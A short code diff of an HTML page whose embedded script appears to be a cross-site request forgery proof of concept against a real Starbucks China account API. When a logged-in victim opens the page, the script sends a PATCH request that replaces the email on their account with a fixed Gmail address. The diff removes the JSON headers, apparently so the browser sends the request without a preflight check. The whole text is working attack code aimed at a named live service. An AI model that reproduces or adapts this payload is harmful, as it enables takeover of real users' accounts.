@@ -7,12 +7,9 @@
 <title>modify the emails</title>
 <script>
 $.ajax({
-            headers : {
-                'Accept' : 'application/json',
-                'Content-Type' : 'application/json'
-            },
             url : 'https://profile.starbucks.com.cn/api/account/email',
             type : 'PATCH',
+            contenttype:'application/json',
             data : "{'email':'esperamier@gmail.com'}",
             success : function(response, textStatus, jqXhr) {
                 alert("Successfully Patched!Your account's email have been modified!");
